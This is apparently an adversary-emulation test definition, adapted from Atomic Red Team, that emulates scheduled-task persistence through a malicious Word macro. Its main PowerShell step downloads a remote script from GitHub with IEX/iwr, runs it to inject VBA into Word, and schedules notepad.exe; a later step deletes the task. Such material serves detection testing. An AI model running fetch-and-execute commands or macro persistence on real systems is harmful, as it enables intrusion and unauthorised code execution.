{
  "id": "ecd3fa21-7792-41a2-8726-2c5c673414d3",
  "name": "Task Scheduler via VBA",
  "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "ca0b845f-f057-4443-ad67-c4982b79a58c",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "aad894b7-06d9-44dc-a4d8-8e664e9388ac",
      "type": "execute-command",
      "data": {
        "command": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "bf3d67fa-5b72-46f5-97c0-d859ea40acde",
      "name": "Check dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "a7fb10cb-e563-41cc-9d60-bc78dd84d1b3",
      "name": "Resolve dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "474780f1-3a91-425b-831d-6be987723995",
      "name": "Re-check dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "ca0b845f-f057-4443-ad67-c4982b79a58c",
      "p": "on-success",
      "o": "aad894b7-06d9-44dc-a4d8-8e664e9388ac"
    },
    {
      "s": "ca0b845f-f057-4443-ad67-c4982b79a58c",
      "p": "on-failure",
      "o": "aad894b7-06d9-44dc-a4d8-8e664e9388ac"
    },
    {
      "s": "bf3d67fa-5b72-46f5-97c0-d859ea40acde",
      "p": "on-success",
      "o": "ca0b845f-f057-4443-ad67-c4982b79a58c"
    },
    {
      "s": "bf3d67fa-5b72-46f5-97c0-d859ea40acde",
      "p": "on-failure",
      "o": "a7fb10cb-e563-41cc-9d60-bc78dd84d1b3"
    },
    {
      "s": "a7fb10cb-e563-41cc-9d60-bc78dd84d1b3",
      "p": "on-success",
      "o": "474780f1-3a91-425b-831d-6be987723995"
    },
    {
      "s": "474780f1-3a91-425b-831d-6be987723995",
      "p": "on-failure",
      "o": "ca0b845f-f057-4443-ad67-c4982b79a58c"
    }
  ],
  "tags": [
    "T1053.005",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "ms_product",
      "type": "string",
      "description": "Maldoc application Word",
      "value": "Word"
    }
  ]
}